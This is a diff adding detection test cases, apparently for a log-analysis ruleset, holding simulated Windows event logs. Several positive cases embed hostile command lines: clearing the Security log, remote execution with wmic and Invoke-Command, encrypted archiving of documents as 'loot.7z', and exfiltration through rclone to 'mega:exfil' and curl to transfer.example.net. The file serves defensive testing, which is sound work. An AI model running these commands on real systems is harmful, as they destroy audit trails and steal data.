@@ -147,5 +147,135 @@
     ],
     "expect_not_rule": "100117",
     "location": "EventChannel"
+  },
+  {
+    "id": "DL-WIN-011",
+    "description": "Security audit log cleared (event 1102)",
+    "log_format": "eventchannel",
+    "events": [
+      "{\"win\": {\"system\": {\"providerName\": \"Microsoft-Windows-Eventlog\", \"eventID\": \"1102\", \"channel\": \"Security\", \"computer\": \"DC01.lab.local\", \"severityValue\": \"INFORMATION\", \"systemTime\": \"2026-11-17T10:00:00.000Z\"}, \"eventdata\": {\"subjectUserName\": \"bob\", \"subjectDomainName\": \"LAB\", \"subjectLogonId\": \"0x5e2a1\"}}}"
+    ],
+    "expect_rule": "100121",
+    "location": "EventChannel"
+  },
+  {
+    "id": "DL-WIN-012",
+    "description": "wevtutil clears the Security log",
+    "log_format": "eventchannel",
+    "events": [
+      "{\"win\": {\"system\": {\"providerName\": \"Microsoft-Windows-Sysmon\", \"eventID\": \"1\", \"level\": \"4\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"computer\": \"WS01.lab.local\", \"severityValue\": \"INFORMATION\", \"systemTime\": \"2026-11-17T10:00:00.000Z\"}, \"eventdata\": {\"utcTime\": \"2026-11-17 10:00:00.000\", \"image\": \"C:\\\\Windows\\\\System32\\\\wevtutil.exe\", \"commandLine\": \"wevtutil.exe cl Security\", \"parentImage\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"user\": \"LAB\\\\bob\", \"processId\": \"5120\", \"parentProcessId\": \"1111\"}}}"
+    ],
+    "expect_rule": "100122",
+    "location": "EventChannel"
+  },
+  {
+    "id": "NEG-WIN-012",
+    "description": "wevtutil QUERY must NOT trigger DL-WIN-012",
+    "log_format": "eventchannel",
+    "events": [
+      "{\"win\": {\"system\": {\"providerName\": \"Microsoft-Windows-Sysmon\", \"eventID\": \"1\", \"level\": \"4\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"computer\": \"WS01.lab.local\", \"severityValue\": \"INFORMATION\", \"systemTime\": \"2026-11-17T10:00:00.000Z\"}, \"eventdata\": {\"utcTime\": \"2026-11-17 10:00:00.000\", \"image\": \"C:\\\\Windows\\\\System32\\\\wevtutil.exe\", \"commandLine\": \"wevtutil.exe qe Security /c:5 /rd:true /f:text\", \"parentImage\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"user\": \"LAB\\\\bob\", \"processId\": \"5120\", \"parentProcessId\": \"1111\"}}}"
+    ],
+    "expect_not_rule": "100122",
+    "location": "EventChannel"
+  },
+  {
+    "id": "DL-WIN-013",
+    "description": "PsExec service PSEXESVC installed (event 7045)",
+    "log_format": "eventchannel",
+    "events": [
+      "{\"win\": {\"system\": {\"providerName\": \"Service Control Manager\", \"eventID\": \"7045\", \"channel\": \"System\", \"computer\": \"DC01.lab.local\", \"severityValue\": \"INFORMATION\", \"systemTime\": \"2026-11-17T10:00:00.000Z\"}, \"eventdata\": {\"serviceName\": \"PSEXESVC\", \"imagePath\": \"%SystemRoot%\\\\PSEXESVC.exe\", \"serviceType\": \"user mode service\", \"startType\": \"demand start\", \"accountName\": \"LocalSystem\"}}}"
+    ],
+    "expect_rule": "100123",
+    "location": "EventChannel"
+  },
+  {
+    "id": "NEG-WIN-013",
+    "description": "Normal service install must NOT trigger DL-WIN-013",
+    "log_format": "eventchannel",
+    "events": [
+      "{\"win\": {\"system\": {\"providerName\": \"Service Control Manager\", \"eventID\": \"7045\", \"channel\": \"System\", \"computer\": \"DC01.lab.local\", \"severityValue\": \"INFORMATION\", \"systemTime\": \"2026-11-17T10:00:00.000Z\"}, \"eventdata\": {\"serviceName\": \"GoogleChromeElevationService\", \"imagePath\": \"\\\"C:\\\\Program Files\\\\Google\\\\Chrome\\\\Application\\\\131.0.6778.86\\\\elevation_service.exe\\\"\", \"serviceType\": \"user mode service\", \"startType\": \"demand start\", \"accountName\": \"LocalSystem\"}}}"
+    ],
+    "expect_not_rule": "100123",
+    "location": "EventChannel"
+  },
+  {
+    "id": "DL-WIN-014",
+    "description": "wmic /node process call create on a remote host",
+    "log_format": "eventchannel",
+    "events": [
+      "{\"win\": {\"system\": {\"providerName\": \"Microsoft-Windows-Sysmon\", \"eventID\": \"1\", \"level\": \"4\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"computer\": \"WS01.lab.local\", \"severityValue\": \"INFORMATION\", \"systemTime\": \"2026-11-17T10:00:00.000Z\"}, \"eventdata\": {\"utcTime\": \"2026-11-17 10:00:00.000\", \"image\": \"C:\\\\Windows\\\\System32\\\\wbem\\\\WMIC.exe\", \"commandLine\": \"wmic /node:10.10.10.20 /user:LAB\\\\admin process call create \\\"C:\\\\Windows\\\\Temp\\\\svc.exe\\\"\", \"parentImage\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"user\": \"LAB\\\\bob\", \"processId\": \"5120\", \"parentProcessId\": \"1111\"}}}"
+    ],
+    "expect_rule": "100124",
+    "location": "EventChannel"
+  },
+  {
+    "id": "DL-WIN-014b",
+    "description": "Invoke-Command -ComputerName (WinRM)",
+    "log_format": "eventchannel",
+    "events": [
+      "{\"win\": {\"system\": {\"providerName\": \"Microsoft-Windows-Sysmon\", \"eventID\": \"1\", \"level\": \"4\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"computer\": \"WS01.lab.local\", \"severityValue\": \"INFORMATION\", \"systemTime\": \"2026-11-17T10:00:00.000Z\"}, \"eventdata\": {\"utcTime\": \"2026-11-17 10:00:00.000\", \"image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"commandLine\": \"powershell.exe -NoProfile -Command Invoke-Command -ComputerName DC01 -ScriptBlock { Get-Process lsass }\", \"parentImage\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"user\": \"LAB\\\\bob\", \"processId\": \"5120\", \"parentProcessId\": \"1111\"}}}"
+    ],
+    "expect_rule": "100124",
+    "location": "EventChannel"
+  },
+  {
+    "id": "NEG-WIN-014",
+    "description": "Local WMI query must NOT trigger DL-WIN-014",
+    "log_format": "eventchannel",
+    "events": [
+      "{\"win\": {\"system\": {\"providerName\": \"Microsoft-Windows-Sysmon\", \"eventID\": \"1\", \"level\": \"4\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"computer\": \"WS01.lab.local\", \"severityValue\": \"INFORMATION\", \"systemTime\": \"2026-11-17T10:00:00.000Z\"}, \"eventdata\": {\"utcTime\": \"2026-11-17 10:00:00.000\", \"image\": \"C:\\\\Windows\\\\System32\\\\wbem\\\\WMIC.exe\", \"commandLine\": \"wmic os get caption,version\", \"parentImage\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"user\": \"LAB\\\\bob\", \"processId\": \"5120\", \"parentProcessId\": \"1111\"}}}"
+    ],
+    "expect_not_rule": "100124",
+    "location": "EventChannel"
+  },
+  {
+    "id": "DL-WIN-015",
+    "description": "7-Zip archive with password and encrypted headers",
+    "log_format": "eventchannel",
+    "events": [
+      "{\"win\": {\"system\": {\"providerName\": \"Microsoft-Windows-Sysmon\", \"eventID\": \"1\", \"level\": \"4\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"computer\": \"WS01.lab.local\", \"severityValue\": \"INFORMATION\", \"systemTime\": \"2026-11-17T10:00:00.000Z\"}, \"eventdata\": {\"utcTime\": \"2026-11-17 10:00:00.000\", \"image\": \"C:\\\\Program Files\\\\7-Zip\\\\7z.exe\", \"commandLine\": \"\\\"C:\\\\Program Files\\\\7-Zip\\\\7z.exe\\\" a -pS3cr3t! -mhe=on C:\\\\Users\\\\Public\\\\loot.7z C:\\\\Users\\\\bob\\\\Documents\\\\*\", \"parentImage\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"user\": \"LAB\\\\bob\", \"processId\": \"5120\", \"parentProcessId\": \"1111\"}}}"
+    ],
+    "expect_rule": "100125",
+    "location": "EventChannel"
+  },
+  {
+    "id": "NEG-WIN-015",
+    "description": "Archive WITHOUT password must NOT trigger DL-WIN-015",
+    "log_format": "eventchannel",
+    "events": [
+      "{\"win\": {\"system\": {\"providerName\": \"Microsoft-Windows-Sysmon\", \"eventID\": \"1\", \"level\": \"4\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"computer\": \"WS01.lab.local\", \"severityValue\": \"INFORMATION\", \"systemTime\": \"2026-11-17T10:00:00.000Z\"}, \"eventdata\": {\"utcTime\": \"2026-11-17 10:00:00.000\", \"image\": \"C:\\\\Program Files\\\\7-Zip\\\\7z.exe\", \"commandLine\": \"\\\"C:\\\\Program Files\\\\7-Zip\\\\7z.exe\\\" a C:\\\\Backup\\\\projects.7z C:\\\\Projects\\\\*\", \"parentImage\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"user\": \"LAB\\\\bob\", \"processId\": \"5120\", \"parentProcessId\": \"1111\"}}}"
+    ],
+    "expect_not_rule": "100125",
+    "location": "EventChannel"
+  },
+  {
+    "id": "DL-WIN-016",
+    "description": "rclone copy to a cloud remote (mega:)",
+    "log_format": "eventchannel",
+    "events": [
+      "{\"win\": {\"system\": {\"providerName\": \"Microsoft-Windows-Sysmon\", \"eventID\": \"1\", \"level\": \"4\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"computer\": \"WS01.lab.local\", \"severityValue\": \"INFORMATION\", \"systemTime\": \"2026-11-17T10:00:00.000Z\"}, \"eventdata\": {\"utcTime\": \"2026-11-17 10:00:00.000\", \"image\": \"C:\\\\Users\\\\Public\\\\rclone.exe\", \"commandLine\": \"C:\\\\Users\\\\Public\\\\rclone.exe copy C:\\\\Users\\\\bob\\\\Documents mega:exfil --transfers 8\", \"parentImage\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"user\": \"LAB\\\\bob\", \"processId\": \"5120\", \"parentProcessId\": \"1111\"}}}"
+    ],
+    "expect_rule": "100126",
+    "location": "EventChannel"
+  },
+  {
+    "id": "DL-WIN-016b",
+    "description": "curl uploads a file with -F file=@",
+    "log_format": "eventchannel",
+    "events": [
+      "{\"win\": {\"system\": {\"providerName\": \"Microsoft-Windows-Sysmon\", \"eventID\": \"1\", \"level\": \"4\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"computer\": \"WS01.lab.local\", \"severityValue\": \"INFORMATION\", \"systemTime\": \"2026-11-17T10:00:00.000Z\"}, \"eventdata\": {\"utcTime\": \"2026-11-17 10:00:00.000\", \"image\": \"C:\\\\Windows\\\\System32\\\\curl.exe\", \"commandLine\": \"curl.exe -F \\\"file=@C:\\\\Users\\\\Public\\\\loot.7z\\\" https://transfer.example.net/upload\", \"parentImage\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"user\": \"LAB\\\\bob\", \"processId\": \"5120\", \"parentProcessId\": \"1111\"}}}"
+    ],
+    "expect_rule": "100126",
+    "location": "EventChannel"
+  },
+  {
+    "id": "NEG-WIN-016",
+    "description": "rclone copy to a LOCAL drive must NOT trigger DL-WIN-016",
+    "log_format": "eventchannel",
+    "events": [
+      "{\"win\": {\"system\": {\"providerName\": \"Microsoft-Windows-Sysmon\", \"eventID\": \"1\", \"level\": \"4\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"computer\": \"WS01.lab.local\", \"severityValue\": \"INFORMATION\", \"systemTime\": \"2026-11-17T10:00:00.000Z\"}, \"eventdata\": {\"utcTime\": \"2026-11-17 10:00:00.000\", \"image\": \"C:\\\\Users\\\\Public\\\\rclone.exe\", \"commandLine\": \"C:\\\\Users\\\\Public\\\\rclone.exe copy C:\\\\Users\\\\bob\\\\Documents D:\\\\Backup\", \"parentImage\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"user\": \"LAB\\\\bob\", \"processId\": \"5120\", \"parentProcessId\": \"1111\"}}}"
+    ],
+    "expect_not_rule": "100126",
+    "location": "EventChannel"
   }
 ]
